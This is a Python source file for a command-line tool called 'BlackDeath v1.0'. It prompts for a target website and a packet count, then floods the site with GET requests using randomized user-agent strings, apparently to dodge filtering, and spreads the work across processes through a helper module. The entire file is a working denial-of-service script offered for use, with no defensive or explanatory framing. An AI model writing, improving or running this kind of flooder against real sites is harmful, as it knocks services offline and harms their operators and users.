from colorama import init
from termcolor import colored
import requests
import sys
from fake_useragent import UserAgent
from lib.threads import start_processes

init()

def DoS_attack(site, packets):
    print(colored("\n[INFO] Starting the DoS attack", "green"))
    try:
        for _ in range(0, packets):
            requests.get(site, headers={"User-Agent": UserAgent().random})
    except Exception as e:
        print(colored(f"[ERROR] {e}", "red"))

def main():
    try:
        while True:
            print(colored("\ns) Start the DoS attack", "green"))
            print(colored("v) Program version", "green"))
            print(colored("q) Quit", "green"))

            print(colored("\n>>>", "green"), end="")
            choice = input()

            if choice == "s":
                print(colored("\nEnter in the target site: ", "green"), end="")
                site = input()
                print(colored("How many packets to send: ", "green"), end="")
                packets = int(input())
                
                start_processes(site, packets)

                print(colored("\n[INFO] Attack complete", "green"))
            elif choice == "v":
                print(colored("\nBlackDeath v1.0", "green"))
            elif choice == "q":
                break
            else:
                print(colored("\nInvalid option", "red"))

    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    print(colored(r""" 
     ____  _            _    ____             _   _
    | __ )| | __ _  ___| | _|  _ \  ___  __ _| |_| |__
    |  _ \| |/ _` |/ __| |/ / | | |/ _ \/ _` | __| '_ \
    | |_) | | (_| | (__|   <| |_| |  __/ (_| | |_| | | |
    |____/|_|\__,_|\___|_|\_\____/ \___|\__,_|\__|_| |_|""", "green"))
    main()